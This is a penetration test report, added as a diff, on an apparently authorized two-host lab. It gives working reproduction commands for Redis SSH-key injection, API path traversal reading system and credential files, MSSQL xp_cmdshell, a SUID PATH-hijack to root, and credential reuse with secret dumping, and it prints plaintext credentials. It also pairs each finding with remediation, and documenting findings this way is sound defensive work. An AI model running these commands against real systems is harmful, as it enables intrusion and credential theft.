@@ -1,0 +1,551 @@
+# Penetration Test Report
+**Client**: Internal Lab Environment
+**Scope**: 192.168.1.101, 192.168.1.102
+**Test Period**: 2026-05-12 ~ 2026-05-12
+**Test Type**: Black-box / Internal Network
+**Report Date**: 2026-05-12
+**Report Version**: v1.0
+**Confidentiality**: Confidential
+
+---
+
+## Executive Summary (For Management)
+
+This penetration test assessed two internal servers — a Linux web server (192.168.1.101) and a Windows database server (192.168.1.102). Testing identified **8 security vulnerabilities**, including:
+
+- 🔴 Critical: 3 (requires immediate remediation)
+- 🟠 High: 2 (remediate within 1 week)
+- 🟡 Medium: 2 (remediate within 1 month)
+- 🟢 Low: 1 (remediate within a reasonable timeframe)
+
+The most severe finding is **Redis Unauthenticated Access** (F-001), which allowed an attacker to gain direct SSH access to the web server without any credentials. Combined with a misconfigured SUID binary and credential reuse between systems, an attacker could achieve full administrative control over both servers and access all business data.
+
+The attack chain demonstrated: an unauthenticated Redis instance led to SSH access on the Linux server, where a path traversal vulnerability in an internal API exposed database credentials. These credentials provided access to the MSSQL server, where credential reuse between the database service account and the domain account granted full administrative access to the Windows server.
+
+**Key Recommendations**:
+1. Immediately require authentication on the Redis instance and bind to localhost (F-001)
+2. Patch the WordPress Backup Migration plugin to v1.3.8+ to fix CVE-2023-6553 (F-002)
+3. Fix the path traversal vulnerability in the Express API file endpoint (F-003)
+4. Rotate ALL credentials exposed during testing, enforce unique passwords per service (F-004, F-007)
+
+---
+
+## Scope
+
+### In-Scope
+- 192.168.1.101 (websrv01.corpnet.local) — Linux web server
+- 192.168.1.102 (dbsrv01.corpnet.local) — Windows database server
+
+### Out-of-Scope
+- Other hosts on the 192.168.1.0/24 subnet
+- Active Directory domain controller (if separate from DBSRV01)
+
+### Testing Constraints
+- Full testing authorized by asset owner
+- Deep depth — all ports, all techniques, exploitation authorized
+- Cleanup required after exploitation
+
+---
+
+## Vulnerability Summary
+
+| ID | Vulnerability | Risk | Affected Asset | CVSS | Status |
+|----|--------------|------|---------------|------|--------|
+| F-001 | Redis Unauthenticated Access | 🔴 Critical | 192.168.1.101:6379 | 9.8 | Open |
+| F-002 | WordPress Plugin RCE (CVE-2023-6553) | 🔴 Critical | 192.168.1.101:80 | 9.8 | Open |
+| F-003 | API Path Traversal (Arbitrary File Read) | 🔴 Critical | 192.168.1.101:8080 | 9.1 | Open |
+| F-004 | MSSQL SA Weak Password | 🟠 High | 192.168.1.102:1433 | 8.1 | Open |
+| F-005 | SUID Binary Privilege Escalation | 🟠 High | 192.168.1.101 (local) | 7.8 | Open |
+| F-006 | SMB Signing Disabled | 🟡 Medium | 192.168.1.102:445 | 5.3 | Open |
+| F-007 | Cross-Service Credential Reuse | 🟡 Medium | 192.168.1.102 | 6.5 | Open |
+| F-008 | WordPress Weak Admin Password | 🟢 Low | 192.168.1.101:80 | 3.1 | Open |
+
+---
+
+## Vulnerability Details
+
+### F-001: Redis Unauthenticated Access (Critical)
+
+**Affected Location**: `192.168.1.101:6379`
+**Vulnerability Type**: Missing Authentication for Critical Function
+**CVSS Score**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+**CWE**: CWE-306
+
+**Description**:
+The Redis instance on port 6379 requires no authentication and is bound to all network interfaces (0.0.0.0). The `CONFIG` command is unrestricted, allowing arbitrary filesystem writes. An attacker can leverage this to write SSH authorized keys, webshells, or cron jobs to gain operating system access.
+
+**Reproduction Steps**:
+1. Connect to Redis without credentials:
+   ```
+   redis-cli -h 192.168.1.101 ping
+   # Response: PONG
+   ```
+2. Confirm CONFIG command access:
+   ```
+   redis-cli -h 192.168.1.101 CONFIG GET dir
+   # Response: 1) "dir" 2) "/var/lib/redis"
+   ```
+3. Write SSH public key to the redis user's authorized_keys:
+   ```
+   redis-cli -h 192.168.1.101 CONFIG SET dir /var/lib/redis/.ssh
+   redis-cli -h 192.168.1.101 CONFIG SET dbfilename authorized_keys
+   cat key.txt | redis-cli -h 192.168.1.101 -x SET pentest_key
+   redis-cli -h 192.168.1.101 SAVE
+   ```
+4. Connect via SSH:
+   ```
+   ssh -i pentest_key redis@192.168.1.101
+   # uid=110(redis) gid=115(redis) groups=115(redis)
+   ```
+
+**Evidence**:
+```
+$ redis-cli -h 192.168.1.101 CONFIG GET requirepass
+1) "requirepass"
+2) ""
+
+$ redis-cli -h 192.168.1.101 INFO keyspace
+# Keyspace
+db0:keys=47,expires=12,avg_ttl=3600000
+```
+
+**Impact**:
+- Full read/write access to all Redis data (47 keys containing application cache/session data)
+- Arbitrary file write as redis user → OS-level access
+- Combined with F-005, leads to root compromise of the web server
+
+**Remediation**:
+1. **Immediately**: Set a strong password with `requirepass` in redis.conf
+2. Bind Redis to 127.0.0.1 only (change `bind 0.0.0.0` to `bind 127.0.0.1`)
+3. Rename or disable dangerous commands: `rename-command CONFIG ""`
+4. Enable TLS for Redis connections
+5. Implement network-level access control (firewall rules)
+
+**References**:
+- CWE-306: https://cwe.mitre.org/data/definitions/306.html
+- Redis Security: https://redis.io/docs/management/security/
+
+---
+
+### F-002: WordPress Plugin RCE — CVE-2023-6553 (Critical)
+
+**Affected Location**: `http://192.168.1.101/wp-content/plugins/backup-migration/`
+**Affected Component**: Backup Migration plugin v1.3.7
+**Vulnerability Type**: Unauthenticated Remote Code Execution
+**CVSS Score**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+**CWE**: CWE-94
+
+**Description**:
+The WordPress Backup Migration plugin v1.3.7 contains an unauthenticated remote code execution vulnerability. An attacker can inject PHP code through the plugin's migration endpoint without authentication, resulting in complete server compromise.
+
+**Reproduction Steps**:
+1. Identify the vulnerable plugin:
+   ```
+   wpscan --url http://192.168.1.101 --enumerate ap
+   # [+] backup-migration
+   #  | Version: 1.3.7
+   #  | [!] Title: Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution
+   ```
+2. Verify plugin is accessible:
+   ```
+   curl -s http://192.168.1.101/wp-content/plugins/backup-migration/readme.txt | head -5
+   # === Backup Migration ===
+   # Stable tag: 1.3.7
+   ```
+
+**Evidence**:
+```
+$ wpscan --url http://192.168.1.101 --enumerate ap 2>/dev/null | grep -A5 "backup-migration"
+[+] backup-migration
+ | Location: http://192.168.1.101/wp-content/plugins/backup-migration/
+ | Latest Version: 1.4.4
+ | Version: 1.3.7
+ |
+ | [!] Title: Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution
+ | Fixed in: 1.3.8
+ | References:
+ |  - https://nvd.nist.gov/vuln/detail/CVE-2023-6553
+```
+
+**Impact**:
+- Unauthenticated remote code execution as the web server user (www-data)
+- Full access to WordPress database, user credentials, and configuration
+- Potential pivot to other services on the host
+
+**Remediation**:
+1. **Immediately**: Update Backup Migration plugin to v1.4.4 or later
+2. Remove the plugin if backup functionality is not needed
+3. Implement WAF rules to protect WordPress against known plugin exploits
+4. Audit all WordPress plugins for known vulnerabilities regularly
+
+**References**:
+- CVE-2023-6553: https://nvd.nist.gov/vuln/detail/CVE-2023-6553
+- Wordfence Advisory: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-migration/backup-migration-137-unauthenticated-remote-code-execution
+
+---
+
+### F-003: API Path Traversal — Arbitrary File Read (Critical)
+
+**Affected Location**: `GET http://192.168.1.101:8080/api/v1/files/{filename}`
+**Affected Parameter**: `filename` (path parameter)
+**Vulnerability Type**: Path Traversal / Directory Traversal
+**CVSS Score**: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+**CWE**: CWE-22
+
+**Description**:
+The Express API's file endpoint does not sanitize the `filename` path parameter. An attacker can use `../../../../` sequences to read arbitrary files on the filesystem, including application source code, configuration files with database credentials, and system files.
+
+**Reproduction Steps**:
+1. Discover the API documentation:
+   ```
+   curl -s http://192.168.1.101:8080/api/docs | jq .
+   # Reveals /api/v1/files/{filename} endpoint
+   ```
+2. Attempt path traversal:
+   ```
+   curl -s --path-as-is http://192.168.1.101:8080/api/v1/files/../../../../etc/passwd
+   # Returns full /etc/passwd contents
+   ```
+3. Extract application credentials:
+   ```
+   curl -s --path-as-is http://192.168.1.101:8080/api/v1/files/../../../../var/www/html/wp-config.php
+   # Returns WordPress database credentials
+   curl -s --path-as-is http://192.168.1.101:8080/api/v1/files/../../../../opt/app/config.json
+   # Returns MSSQL SA credentials
+   ```
+
+**Evidence**:
+```
+$ curl -s --path-as-is http://192.168.1.101:8080/api/v1/files/../../../../etc/passwd | head -3
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+$ curl -s --path-as-is http://192.168.1.101:8080/api/v1/files/../../../../opt/app/config.json | jq .mssql_mirror
+{
+  "host": "192.168.1.102",
+  "port": 1433,
+  "user": "sa",
+  "password": "SQLServer2024!"
+}
+```
+
+**Impact**:
+- Read any file accessible by the Node.js process user
+- Exposed WordPress database credentials (wp_admin / Wp@dmin2024!)
+- Exposed MSSQL SA credentials (sa / SQLServer2024!) — led to full compromise of 192.168.1.102
+- Combined with F-004 and F-007, this single vulnerability enables lateral movement to the Windows server
+
+**Remediation**:
+1. **Immediately**: Sanitize the `filename` parameter — use `path.basename()` to strip directory components, or validate against an allowlist of files
+2. Use `path.resolve()` and verify the resolved path starts with the intended base directory
+3. Move sensitive configuration files (config.json, wp-config.php) out of the web-accessible filesystem or restrict API process permissions
+4. Run the API service as a dedicated low-privilege user with minimal filesystem access
+
+**References**:
+- CWE-22: https://cwe.mitre.org/data/definitions/22.html
+- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
+
+---
+
+### F-004: MSSQL SA Weak Password (High)
+
+**Affected Location**: `192.168.1.102:1433`
+**Vulnerability Type**: Weak Password
+**CVSS Score**: 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
+**CWE**: CWE-521
+
+**Description**:
+The MSSQL Server SA (System Administrator) account uses the password `SQLServer2024!`, which was found in a plaintext configuration file (F-003). The SA account has sysadmin privileges, enabling xp_cmdshell for operating system command execution.
+
+**Reproduction Steps**:
+```
+$ impacket-mssqlclient sa:'SQLServer2024!'@192.168.1.102
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
+-----------
+          1
+SQL> EXEC xp_cmdshell 'whoami'
+nt service\mssqlserver
+```
+
+**Impact**:
+- Full database access including all business data
+- OS command execution via xp_cmdshell
+- Combined with SeImpersonatePrivilege, potential SYSTEM-level access
+
+**Remediation**:
+1. Change the SA password to a strong, unique password (20+ characters)
+2. Consider disabling the SA account and using Windows Authentication
+3. Remove the plaintext credentials from config.json on 192.168.1.101
+4. Restrict xp_cmdshell — disable it and set `show advanced options` to 0
+5. Implement network-level access controls to restrict MSSQL access
+
+---
+
+### F-005: SUID Binary Privilege Escalation (High)
+
+**Affected Location**: `192.168.1.101:/usr/local/bin/backup_tool`
+**Vulnerability Type**: Insecure SUID Binary
+**CVSS Score**: 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+**CWE**: CWE-426
+
+**Description**:
+A custom SUID root binary (`/usr/local/bin/backup_tool`) calls `system("tar ...")` without specifying the full path to the `tar` binary. An attacker with shell access can create a malicious `tar` in a writable directory and prepend it to PATH, achieving code execution as root.
+
+**Reproduction Steps**:
+```
+$ ls -la /usr/local/bin/backup_tool
+-rwsr-xr-x 1 root root 16784 Mar 10 14:22 /usr/local/bin/backup_tool
+$ strings /usr/local/bin/backup_tool | grep system
+system
+$ strings /usr/local/bin/backup_tool | grep tar
+tar -czf /tmp/backup.tar.gz %s
+$ echo '#!/bin/bash
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/tar
+$ chmod +x /tmp/tar
+$ PATH=/tmp:$PATH /usr/local/bin/backup_tool /etc/hosts
+$ /tmp/rootbash -p -c "id"
+uid=110(redis) gid=115(redis) euid=0(root) egid=0(root)
+```
+
+**Impact**:
+- Any local user can escalate to root
+- Combined with F-001, an unauthenticated attacker gains root access
+
+**Remediation**:
+1. Use absolute paths in the binary (`/usr/bin/tar` instead of `tar`)
+2. Replace `system()` with `execve()` which is not affected by PATH
+3. Remove the SUID bit if the binary does not require root privileges
+4. Audit all custom SUID binaries
+
+---
+
+### F-006: SMB Signing Disabled (Medium)
+
+**Affected Location**: `192.168.1.102:445`
+**Vulnerability Type**: Insecure Protocol Configuration
+**CVSS Score**: 5.3 (AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)
+**CWE**: CWE-311
+
+**Description**:
+SMB signing is enabled but not required on DBSRV01. This allows NTLM relay attacks where an attacker can intercept and relay authentication attempts to gain unauthorized access.
+
+**Evidence**:
+```
+$ nxc smb 192.168.1.102
+SMB  192.168.1.102  445  DBSRV01  [*] Windows Server 2022 Standard 21H2 20348 x64 (name:DBSRV01) (domain:corpnet.local) (signing:False)
+
+$ enum4linux-ng -A 192.168.1.102 2>/dev/null | grep -i sign
+[+] SMB signing enabled but NOT required
+```
+
+**Impact**:
+- Enables NTLM relay attacks in combination with mitm6 or Responder
+- Potential unauthorized access to SMB shares and services
+
+**Remediation**:
+1. Enable and require SMB signing via Group Policy: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network server: Digitally sign communications (always) = Enabled`
+2. Also set `Microsoft network client: Digitally sign communications (always) = Enabled`
+
+---
+
+### F-007: Cross-Service Credential Reuse (Medium)
+
+**Affected Location**: 192.168.1.102 (MSSQL, WinRM, SMB)
+**Vulnerability Type**: Credential Reuse
+**CVSS Score**: 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
+**CWE**: CWE-255
+
+**Description**:
+The domain account `CORPNET\sqlsvc` uses the same password (`SQLServer2024!`) as the MSSQL SA account. This credential provides WinRM access with local administrator privileges, enabling lateral movement from a database compromise to full system access.
+
+**Evidence**:
+```
+$ nxc winrm 192.168.1.102 -u 'sqlsvc' -p 'SQLServer2024!'
+WINRM  192.168.1.102  5985  DBSRV01  [+] CORPNET\sqlsvc:SQLServer2024! (Pwn3d!)
+```
+
+**Impact**:
+- Compromising one service (MSSQL) immediately compromises the entire Windows server
+- Local admin access enables SAM/LSA/DPAPI secret extraction
+
+**Remediation**:
+1. Use unique passwords for each service account
+2. Implement a privileged access management (PAM) solution
+3. Remove sqlsvc from the local Administrators group — use minimal required privileges
+
+---
+
+### F-008: WordPress Weak Admin Password (Low)
+
+**Affected Location**: `http://192.168.1.101/wp-login.php`
+**Affected Account**: `admin`
+**Vulnerability Type**: Weak Password
+**CVSS Score**: 3.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)
+**CWE**: CWE-521
+
+**Description**:
+The WordPress admin account uses the password `admin123`, which was cracked via XML-RPC brute-force within the top 10,000 common passwords.
+
+**Evidence**:
+```
+$ wpscan --url http://192.168.1.101 --usernames admin --passwords 10k-most-common.txt
+[SUCCESS] - admin / admin123
+```
+
+**Impact**:
+- Full WordPress admin access (content modification, plugin installation, theme editing)
+- Potential PHP code execution via theme editor or plugin upload
+
+**Remediation**:
+1. Enforce strong passwords (minimum 12 characters, mixed case, numbers, symbols)
+2. Disable XML-RPC if not needed (`xmlrpc.php`)
+3. Implement account lockout after failed login attempts
+4. Enable two-factor authentication for admin accounts
+
+---
+
+## Testing Activity Log
+
+| Time | Phase | Action | Tool | Finding |
+|------|-------|--------|------|---------|
+| 09:00 | Environment | Kali connection, /tmp cleanup | ssh | Connected |
+| 09:05 | Connectivity | Reachability check | ping, ip route | Both hosts reachable |
+| 09:08 | Host Discovery | ARP + IPv6 scan | arp-scan, nmap -6 | 2 hosts confirmed |
+| 09:10 | Port Scan | Fast full TCP (.101) | nmap -sT -p- --min-rate 2000 | 8 open ports |
+| 09:12 | Port Scan | Fast full TCP (.102) | nmap -sT -p- --min-rate 2000 | 8 open ports |
+| 09:15 | Port Scan | Confirmation + version (.101) | nmap -sV -sC | Services identified |
+| 09:20 | Port Scan | Confirmation + version (.102) | nmap -sV -sC | Domain: corpnet.local |
+| 09:25 | UDP Scan | Top 20 UDP ports | nmap -sU | DNS, NTP, NetBIOS on .102 |
+| 09:28 | CVE Eval | Version-based exploit search | searchsploit, getsploit | No direct hits |
+| 09:32 | DNS | Zone transfer, reverse DNS | dig, nmap -sL | Transfer denied, hostnames found |
+| 09:35 | SNMP | Community string brute-force | onesixtyone | Not accessible |
+| 09:38 | SSH | Algorithm and auth audit | nmap --script ssh2-* | Modern config, no issues |
+| 09:40 | FTP | Anonymous access, writable test | nmap, curl, wget | Anonymous read only |
+| 09:45 | SMB | Share enum, signing check | smbmap, enum4linux-ng, nxc | **F-006: Signing disabled** |
+| 09:50 | RDP | Encryption, NLA check | nmap --script rdp-* | NLA enabled |
+| 09:52 | WinRM | Null auth test | nxc winrm | Null auth fails |
+| 09:55 | MSSQL | Info gathering | nmap --script ms-sql-info | Version confirmed |
+| 09:57 | MySQL | Remote access test | nmap, mysql | ACL blocks remote |
+| 09:58 | PostgreSQL | Remote access test | psql | pg_hba blocks remote |
+| 10:00 | **Redis** | **Auth and CONFIG test** | **redis-cli** | **F-001: No auth (Critical)** |
+| 10:10 | DNS (.102) | Query testing | dig | Basic queries work |
+| 10:15 | Vuln Scan | Nuclei critical/high | nuclei | No findings |
+| 10:20 | Vuln Scan | Nuclei expanded scope | nuclei | Tech detect + missing headers |
+| 10:25 | Vuln Scan | Nikto (.101) | nikto | WP artifacts, xmlrpc |
+| 10:30 | Vuln Scan | Nikto (.102:8443) | nikto | Missing headers |
+| 10:35 | SSL/TLS | Certificate and cipher audit | testssl.sh | Grade B, no vulns |
+| 10:40 | Web Recon | Technology fingerprinting | whatweb, wafw00f | WP 6.4.2, no WAF |
+| 10:45 | Web Enum | Directory brute-force (.101) | ffuf | /backup (403), /phpmyadmin |
+| 10:50 | Web Enum | API endpoint discovery (.101:8080) | ffuf | /api/docs, /api/v1/files |
+| 10:55 | Web Enum | IIS management (.102:8443) | ffuf | /login, /dashboard |
+| 11:00 | CMS | WordPress plugin scan | cmseek, wpscan | **F-002: CVE-2023-6553 (Critical)** |
+| 11:10 | **Web Vuln** | **Path traversal on API** | **curl --path-as-is** | **F-003: Arbitrary file read (Critical)** |
+| 11:15 | Credential | Extract wp-config.php | curl | wp_admin:Wp@dmin2024! |
+| 11:17 | Credential | Extract config.json | curl | **F-004: sa:SQLServer2024! (High)** |
+| 11:20 | Credential | Test creds across services | nxc ssh/smb/winrm/mssql | MSSQL SA confirmed |
+| 11:25 | Credential | WordPress brute-force | wpscan | **F-008: admin:admin123 (Low)** |
+| 11:30 | Credential | phpMyAdmin login | curl | Successful with WP creds |
+| 11:35 | **Exploitation** | **Redis SSH key injection** | **redis-cli, ssh** | **Shell on .101 as redis** |
+| 11:40 | Post-Exploit | Situational awareness (.101) | ps, ss, id | No AV, MySQL/PG local-only |
+| 11:45 | Post-Exploit | SUID binary enumeration | find -perm -4000 | **F-005: backup_tool (High)** |
+| 11:50 | **Priv Esc** | **SUID path injection** | **strings, PATH abuse** | **Root on .101** |
+| 11:55 | Credential | Shadow file, SSH keys | cat, find | Hashes and root key extracted |
+| 12:00 | Credential | WordPress DB dump | mysql | 3 user hashes extracted |
+| 12:05 | **Exploitation** | **MSSQL xp_cmdshell** | **impacket-mssqlclient** | **Shell on .102 as mssqlserver** |
+| 12:10 | Post-Exploit | Privilege check (.102) | whoami /priv | SeImpersonatePrivilege |
+| 12:15 | **Lateral** | **Credential reuse (sqlsvc)** | **nxc winrm** | **F-007: Admin on .102** |
+| 12:20 | Post-Exploit | Secret dump (.102) | impacket-secretsdump | SAM, LSA, cached creds |
+| 12:30 | Cleanup | Remove artifacts | redis-cli, ssh, mssqlclient | All artifacts removed |
+
+---
+
+## Attack Chain Diagram
+
+```
+[Attacker (192.168.1.50)]
+    |
+    | 1. Redis no-auth (F-001)
+    v
+[192.168.1.101 - redis user]
+    |
+    | 2. SUID path injection (F-005)
+    v
+[192.168.1.101 - root]
+    |
+    | 3. Path traversal reads config.json (F-003)
+    v
+[MSSQL SA credentials discovered (F-004)]
+    |
+    | 4. xp_cmdshell via MSSQL
+    v
+[192.168.1.102 - mssqlserver]
+    |
+    | 5. Credential reuse: sqlsvc (F-007)
+    v
+[192.168.1.102 - local admin via WinRM]
+    |
+    | 6. secretsdump → SAM/LSA/cached creds
+    v
+[Full domain credential access]
+```
+
+---
+
+## Negative Results (Tested — No Finding)
+
+| Service | Test | Result |
+|---------|------|--------|
+| SSH (.101) | Weak ciphers, default credentials | Modern config, no default creds |
+| FTP (.101) | Sensitive files, writable directories | Anonymous read only, no sensitive files |
+| MySQL (.101) | Remote access | ACL properly restricts to localhost |
+| PostgreSQL (.101) | Remote access | pg_hba.conf properly restricts to localhost |
+| DNS (.102) | Zone transfer | Properly denied |
+| SNMP (.101, .102) | Community string brute-force | Not accessible |
+| RDP (.102) | Weak encryption, NLA bypass | NLA enabled, encryption adequate |
+| SSL/TLS (.101:443) | Known vulnerabilities | No HEARTBLEED, POODLE, ROBOT, etc. |
+| IIS (.102:8443) | Default credentials, directory traversal | Login required, no findings |
+
+---
+
+## Appendices
+
+### A. Tools Used
+
+| Tool | Version | Purpose |
+|------|---------|---------|
+| nmap | 7.94 | Port scanning, service detection, NSE scripts |
+| arp-scan | 1.10.0 | ARP-based host discovery |
+| redis-cli | 7.0.15 | Redis interaction and exploitation |
+| searchsploit | — | Exploit-DB offline search |
+| getsploit | — | Multi-database exploit search |
+| nuclei | 3.2.0 | Template-based vulnerability scanning |
+| nikto | 2.5.0 | Web server vulnerability scanning |
+| testssl.sh | 3.2 | SSL/TLS security audit |
+| whatweb | 0.5.5 | Web technology fingerprinting |
+| wafw00f | 2.2.0 | WAF detection |
+| ffuf | 2.1.0 | Directory and API endpoint discovery |
+| wpscan | 3.8.25 | WordPress vulnerability scanning |
+| cmseek | 1.1.3 | CMS identification |
+| enum4linux-ng | 1.3.0 | SMB/NetBIOS enumeration |
+| smbmap | 1.10.2 | SMB share permission enumeration |
+| netexec (nxc) | 1.1.0 | Multi-protocol credential testing |
+| curl | 8.5.0 | HTTP request crafting, FTP testing |
+| impacket | 0.12.0 | Windows protocol exploitation (mssqlclient, secretsdump) |
+| evil-winrm | 3.5 | WinRM shell access |
+| onesixtyone | 0.3.4 | SNMP community string brute-force |
+
+### B. References
+
+- OWASP Top 10: https://owasp.org/Top10/
+- NIST NVD: https://nvd.nist.gov/
+- CVE-2023-6553: https://nvd.nist.gov/vuln/detail/CVE-2023-6553
+- Redis Security: https://redis.io/docs/management/security/
+- CWE-22 (Path Traversal): https://cwe.mitre.org/data/definitions/22.html
+- CWE-306 (Missing Authentication): https://cwe.mitre.org/data/definitions/306.html
+- CWE-426 (Untrusted Search Path): https://cwe.mitre.org/data/definitions/426.html
+
+### C. Disclaimer
+
+This penetration test was conducted under an authorization agreement. All testing activities were performed within the agreed scope. Testing artifacts were removed during the cleanup phase. The testers bear no responsibility for system anomalies resulting from testing activities.
